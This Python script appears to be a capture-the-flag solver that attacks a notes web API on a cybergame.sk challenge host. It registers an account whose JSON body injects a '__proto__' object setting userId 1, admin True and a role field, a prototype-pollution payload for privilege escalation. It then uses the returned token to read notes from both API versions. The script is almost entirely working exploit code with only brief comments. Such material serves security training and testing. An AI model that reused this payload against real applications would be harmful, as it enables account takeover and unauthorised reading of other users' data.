import requests

url = "http://exp.cybergame.sk:7021/api/v2/login"
headers = {"Content-Type": "application/json"}

# What if we pollute something like `where` or `userId` in the notes query?
# Let's create a user and then list notes, but with prototype polluted `userId: 1`
url_reg = "http://exp.cybergame.sk:7021/api/v2/register"
payload = {
    "username": "admin2002",
    "password": "password",
    "__proto__": {
        "userId": 1,
        "user_id": 1,
        "admin": True,
        "role": 1
    }
}
r = requests.post(url_reg, json=payload, headers=headers)
token = r.json().get("token")
print("Reg:", r.text)

r2 = requests.get("http://exp.cybergame.sk:7021/api/v2/notes", headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
print("Notes v2:", r2.text)

r3 = requests.get("http://exp.cybergame.sk:7021/api/v1/notes", headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"})
print("Notes v1:", r3.text)
